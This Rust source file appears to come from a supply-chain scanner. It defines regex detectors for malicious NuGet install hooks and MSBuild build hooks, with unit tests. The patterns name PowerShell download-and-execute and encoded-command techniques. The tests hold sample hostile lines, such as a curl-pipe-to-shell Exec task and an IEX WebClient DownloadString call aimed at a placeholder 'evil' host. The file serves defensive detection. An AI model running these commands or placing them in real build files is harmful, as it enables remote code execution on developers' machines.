//! NuGet-specific detection rules.
//!
//! These complement the ecosystem-agnostic rules in `argus-rules`
//! (`credential-access`, `network-exfiltration`, `ai-context-poisoning`,
//! etc.), which we still apply by calling `argus_rules::scan_text_file` on
//! every extracted text file.
//!
//! The NuGet trigger surface is the *install / build* hook layer:
//!
//! - PowerShell install hooks (`init.ps1`, `install.ps1`, `uninstall.ps1`)
//!   that run in the Package Manager Console on install/uninstall.
//! - MSBuild `.targets` / `.props` under `build/` or `buildTransitive/`
//!   that run automatically on every consumer `dotnet build` — strictly
//!   worse than a console-only install hook.
//!
//! The malware *body* in most real NuGet attacks ships as compiled managed
//! DLLs under `lib/`, which argus treats as binary and does NOT decompile.
//! See the crate docs for that blind-spot disclosure.

#[cfg(test)]
use argus_core::Finding;
use regex::Regex;
use std::sync::OnceLock;

/// PowerShell content that downloads + executes code at install time. This
/// is the highest-concern signal: a `.ps1` install hook that pulls a remote
/// payload and runs it.
pub fn powershell_download_exec_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(?ix)
            (?:
                Invoke-WebRequest |
                Invoke-RestMethod |
                \bIEX\b |
                Invoke-Expression |
                DownloadString |
                DownloadFile |
                DownloadData |
                Start-Process |
                New-Object \s+ (?:System\.)?Net\.WebClient |
                \[ Reflection\.Assembly \] :: Load
            )
            "#,
        )
        .unwrap()
    })
}

/// PowerShell obfuscation / encoded-command markers — base64 payloads and
/// `-EncodedCommand` are classic loader shapes.
pub fn powershell_obfuscation_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(?ix)
            (?:
                FromBase64String |
                -enc(?:odedcommand)?\b |
                \[ Convert \] :: FromBase64String
            )
            "#,
        )
        .unwrap()
    })
}

/// MSBuild element that executes a command or downloads a file at build
/// time — `<Exec Command=...>`, `<DownloadFile ...>`, or a custom inline
/// `<Task><Code>` block. These fire on every consumer `dotnet build`.
pub fn msbuild_exec_task_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r#"(?ix)
            <\s*(?:
                Exec\b |
                DownloadFile\b |
                Code\b
            )
            "#,
        )
        .unwrap()
    })
}

/// MSBuild `<UsingTask ... AssemblyFile=...>` referencing a packaged DLL —
/// build-time arbitrary code execution from a packaged assembly. XML permits
/// either single or double quotes around the attribute value
/// (`AssemblyFile="x.dll"` or `AssemblyFile='x.dll'`), so the detector
/// requires a following quote of either kind.
pub fn msbuild_inline_task_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r#"(?ix)<\s*UsingTask\b[^>]*\bAssemblyFile\s*=\s*["']"#).unwrap())
}

/// Push name-based findings (typosquatting + low-reputation) onto the
/// running findings list. Matches the pypi/crates shape.
#[cfg(test)]
pub fn push_name_findings(name: &str, findings: &mut Vec<Finding>) -> anyhow::Result<()> {
    argus_rules::RuleSession::builtin()?.push_typosquat_findings(
        argus_core::Ecosystem::NuGet,
        name,
        "NuGet id",
        findings,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn powershell_download_exec_fires() {
        assert!(powershell_download_exec_regex()
            .is_match("Invoke-WebRequest http://evil/x -OutFile p.exe"));
        assert!(powershell_download_exec_regex()
            .is_match("iex (New-Object Net.WebClient).DownloadString('http://x')"));
        assert!(powershell_download_exec_regex().is_match("Start-Process p.exe"));
    }

    #[test]
    fn powershell_benign_does_not_fire() {
        let benign = "param($installPath)\nWrite-Host \"Thanks for installing\"\n";
        assert!(!powershell_download_exec_regex().is_match(benign));
        assert!(!powershell_obfuscation_regex().is_match(benign));
    }

    #[test]
    fn powershell_obfuscation_fires() {
        assert!(powershell_obfuscation_regex().is_match("[Convert]::FromBase64String($payload)"));
        assert!(powershell_obfuscation_regex().is_match("powershell -enc SQBFAFgA"));
    }

    #[test]
    fn msbuild_exec_task_fires() {
        assert!(msbuild_exec_task_regex()
            .is_match(r#"<Target><Exec Command="curl evil|sh"/></Target>"#));
        assert!(msbuild_exec_task_regex().is_match(r#"<DownloadFile SourceUrl="http://x"/>"#));
    }

    #[test]
    fn msbuild_benign_does_not_fire() {
        let benign = r#"<Project><ItemGroup><Reference Include="System"/></ItemGroup></Project>"#;
        assert!(!msbuild_exec_task_regex().is_match(benign));
        assert!(!msbuild_inline_task_regex().is_match(benign));
    }

    #[test]
    fn msbuild_inline_task_fires() {
        assert!(msbuild_inline_task_regex()
            .is_match(r#"<UsingTask TaskName="Evil" AssemblyFile="evil.dll"/>"#));
    }

    #[test]
    fn msbuild_inline_task_fires_single_quoted_assemblyfile() {
        // XML allows single quotes around attribute values; an attacker can
        // use them to dodge a double-quote-only detector.
        assert!(msbuild_inline_task_regex()
            .is_match(r#"<UsingTask TaskName="Evil" AssemblyFile='x.dll' />"#));
    }

    #[test]
    fn typosquat_newtonsift_fires() {
        // `Newtonsift.Json` is exactly one substitution (o→i) from the
        // popular `Newtonsoft.Json` (Levenshtein distance 1).
        let mut f = Vec::new();
        push_name_findings("Newtonsift.Json", &mut f).unwrap();
        let rules: Vec<&str> = f.iter().map(|x| x.rule_id.as_str()).collect();
        assert!(rules.contains(&"typosquatting"), "got: {rules:?}");
        assert!(rules.contains(&"low-reputation"), "got: {rules:?}");
    }

    #[test]
    fn legitimate_name_does_not_fire() {
        let mut f = Vec::new();
        push_name_findings("Newtonsoft.Json", &mut f).unwrap();
        assert!(f.is_empty());
    }
}
